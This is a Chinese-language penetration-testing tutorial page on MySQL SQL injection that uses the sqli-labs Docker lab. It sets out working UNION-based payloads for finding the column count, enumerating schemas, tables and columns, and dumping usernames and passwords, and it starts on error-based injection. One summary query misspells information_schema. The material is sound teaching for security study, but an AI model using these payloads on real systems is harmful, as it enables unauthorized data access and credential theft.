href="/docs/渗透测试/WEB漏洞/"><span>WEB漏洞</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/WEB漏洞/SQL注入/"><span>SQL注入</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/mysql"><span>MySQL</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">各种注入手法</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>各种注入手法</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前情提要">前情提要<a href="#前情提要" class="hash-link" aria-label="前情提要的直接链接" title="前情提要的直接链接">​</a></h2>
<ol>
<li>
<p>所有的注入过程中，都需要思考目标可能使用的SQL语句，再根据我们可以控制的部分结构进行尝试注入</p>
</li>
<li>
<p>字符型注入都需要先闭合才可以继续进行</p>
</li>
<li>
<p><code>sqli-labs</code>环境快速搭建</p>
</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> pull acgpiano/sqli-labs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--name</span><span class="token plain"> sqli </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token plain">:80 acgpiano/sqli-labs</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="联合union查询注入">联合(UNION)查询注入<a href="#联合union查询注入" class="hash-link" aria-label="联合(UNION)查询注入的直接链接" title="联合(UNION)查询注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念">概念<a href="#概念" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p>页面将SQL语句执行后返回的内容显示在了页面中(如下例子中是标题、账号密码等信息)，这种情况就叫有回显。</p>
<p>对于有回显的情况来说，通常使用联合查询注入法，其作用就是，在原来查询条件的基础上，通过关键字<code>union</code>、<code>union all</code>拼接恶意SQL语句，<code>union</code>后面的<code>select</code>得到的结果将拼接到前个<code>select</code>的结果的后面</p>
<p>正常情况下，SQL语句的union联合查询常用格式如下</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> xxx </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> vuls</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">+---+---+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">| 1 | 2 | 3 |</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">+---+---+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">| 1 | 2 | 3 |</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">| 4 | 5 | 6 |</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">+---+---+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<p>在注入过程中，我们把<code>union select 4,5,6 from vuls</code>部分称作是union注入部分,它的主要特点是通过union和前面一条SQL语句拼接，并构造其列数与前面的SQL语句列数相同,如1,2,3和4,5,6均为3列。我们把这种注入方式称为union注入。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注意">注意<a href="#注意" class="hash-link" aria-label="注意的直接链接" title="注意的直接链接">​</a></h3>
<ol>
<li>union查询时，我们构造的select语句的字段数要和当前表的字段数相同才能联合查询，否则会抛出<code>The used SELECT statements have a different number of columns</code>的错误</li>
<li>若回显仅支持第一行数据的话，我们需要让union前边正常查询的语句返回的结果为空，才能让我们想要的数据展现出来；返回为空只需要让union前面的内容在数据库中查询不到结果即可</li>
<li><code>union</code>，<code>union all</code>区别<!-- -->
<ul>
<li><code>union</code>: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序</li>
<li><code>union all</code>: 对两个结果集进行并集操作，包括重复行，不进行排序</li>
</ul>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入流程">注入流程<a href="#注入流程" class="hash-link" aria-label="注入流程的直接链接" title="注入流程的直接链接">​</a></h3>
<p><strong>1、确认列数：<strong>前面说过，我们union查询前后的字段数必须是一样的才能查询，因此我们的第一步，就是</strong>通过<code>order by</code>或者<code>group by</code>获取当前查询的字段数</strong>；</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>返回正常，说明前面查询的列数 &gt;= 3</p>
<p><img decoding="async" loading="lazy" alt="image-20211219095234265" src="/assets/images/image-20211219095234265-28878518da135df6611a7f985aa365ee.png" width="2212" height="416" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>返回不正常，说明前面查询的列数 &lt; 4（不正常可能是直接抛出异常，也可能是返回空内容等）</p>
<p><img decoding="async" loading="lazy" alt="image-20211219095406825" src="/assets/images/image-20211219095406825-c5a1d3280fa8b5d962368ea2030735e1.png" width="1792" height="358" class="img_ev3q"></p>
<p>因此说明此处的查询列数为3</p>
<p><strong>2、判断显位：<strong>既然已经知道了查询列数了，那我们就需要</strong>判断哪些列的内容是可以显示到前端的</strong>，因为能显示到前端的字段，我们在利用时也能直接显示我们想要的数据</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>执行后页面正常</p>
<p><img decoding="async" loading="lazy" alt="image-20211219095700559" src="/assets/images/image-20211219095700559-b2d8d8be406cef1b198290a55001cf37.png" width="1788" height="422" class="img_ev3q"></p>
<p>没有显示出1、2、3相关的内容，这是因为查询只显示第一条结果，我们只需要让union查询前半部分的内容为空即可</p>
<p><img decoding="async" loading="lazy" alt="image-20211219100333865" src="/assets/images/image-20211219100333865-6a1148569d96bd3c9e8a8f0be713eafb.png" width="1550" height="740" class="img_ev3q"></p>
<p>修改后的payload</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>可以看到2、3这两列为显位</p>
<p><img decoding="async" loading="lazy" alt="image-20211219100438146" src="/assets/images/image-20211219100438146-f93ff6179b2b5b98a14e46057ea3bbf6.png" width="1710" height="430" class="img_ev3q"></p>
<p>**3、获取数据：**已经知道哪些列可以显示出来了，直接替换为我们的sql语句即可</p>
<p>首先查询当前数据库名<code>database()</code>、数据库账号<code>user()</code>、数据库版本<code>version()</code>等基本信息，再根据不同版本，不同的权限来确定接下来的方法</p>
<table><thead><tr><th>版本</th><th>手法说明</th></tr></thead><tbody><tr><td>MySQL &lt; 5.0</td><td>小于5.0，由于缺乏系统库<code>information_schema</code>，故通常情况下，无法直接找到表，字段等信息，只能通过猜解的方式来解决<br>直接猜库名，表名，列名，再使用联合查询，当然也可以使用布尔注入来猜解</td></tr><tr><td>MySQL &gt;= 5.0</td><td>存在系统库<code>information_schema</code>，可直接查询到库名，表名，列名等信息</td></tr></tbody></table>
<p>查询数据的一般顺序为<strong>库名 --&gt; 表名 --&gt; 列名 --&gt; 字段内容</strong>，其他内容可以按需查询扩展</p>
<p>查询当前数据库名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219100717666" src="/assets/images/image-20211219100717666-a1bfae1c9b309721d8c69d0a0ec8163b.png" width="1684" height="422" class="img_ev3q"></p>
<p>查询所有数据库名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">schema_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">schemata</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219101352056" src="/assets/images/image-20211219101352056-58bb7e0c044921290925be5ac2204ac0.png" width="2222" height="416" class="img_ev3q"></p>
<p>查询当前数据库的所有表名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">table_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_schema</span><span class="token operator" style="color:#393A34">=</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219101623069" src="/assets/images/image-20211219101623069-67ad788397f1ab77bb461fb411eb0e74.png" width="1860" height="450" class="img_ev3q"></p>
<p>查询当前数据库中表<code>users</code>的所有列名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="token plain">users&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219113516650" src="/assets/images/image-20211219113516650-d675061cbdf86e7630c762e93a9f21c6.png" width="1834" height="428" class="img_ev3q"></p>
<p>查询当前数据库中表<code>users</code>的列<code>username</code>和<code>password</code>的值</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x7e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x7e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">password</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users</span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219114656279" src="/assets/images/image-20211219114656279-36309660c07659a2efc0ea12488f2419.png" width="3580" height="496" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h3>
<p>简单来说，整个UNION注入的过程：判断列数 -&gt; 判断显位 -&gt; 查库名 -&gt; 查表名 -&gt; 查列名 -&gt; 查值</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 判断字段数目</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">group</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 联合查询搜集信息(表中字段数为3，注意字符类型，如 int，String之类的)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询当前数据库名称</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询所有数据库</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">schema_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">schemata</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询当前数据库中的所有表名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">table_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_schema </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询某表的列名，studnet 表示 具体的表名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">column_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_shcema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;student&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">age</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> student</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="扩展limit注入点字段数判断">扩展：limit注入点字段数判断<a href="#扩展limit注入点字段数判断" class="hash-link" aria-label="扩展：limit注入点字段数判断的直接链接" title="扩展：limit注入点字段数判断的直接链接">​</a></h3>
<p>如果注入点在limit后，想要判断字段数，可通过<code>into @,@</code>的手法，其中<code>@</code>为mysql的临时变量</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> @</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">@</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220120161725665" src="/assets/images/image-20220120161725665-86618d84ab03d7aae94a03b1c65d5718.png" width="1746" height="680" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="报错注入">报错注入<a href="#报错注入" class="hash-link" aria-label="报错注入的直接链接" title="报错注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念-1">概念<a href="#概念-1" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p>服务器会将数据库执行产生的异常信息抛出显示到前端，这个时候我们人为地制造错误条件，就可以让查询结果能够出现在错误信息中。</p>
<p>一般用于UNION注入受限且能返回错误信息的情况下，毕竟盲注要发送很多类似的请求，耗时且容易被封。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注意-1">注意<a href="#注意-1" class="hash-link" aria-label="注意的直接链接" title="注意的直接链接">​</a></h3>
<ol>
<li>报错函数通常有最长报错信息输出的限制（限制了输出长度，比如只能显示32位），面对这种情况，可以进行分割输出</li>
<li>特殊函数的特殊参数运行一个字段、一行数据的返回，使用<code>group_concat</code>等函数聚合数据即可</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入流程-1">注入流程<a href="#注入流程-1" class="hash-link" aria-label="注入流程的直接链接" title="注入流程的直接链接">​</a></h3>
<p>直接查询数据库，不需要判断字段数、显位等；查询语句和UNION一样，毕竟都是从数据库中查询数据，此处举几个例子说明即可。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 确认闭合</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219115931261" src="/assets/images/image-20211219115931261-7478e06a042b12140db5a3e1291c3069.png" width="1650" height="420" class="img_ev3q"></p>
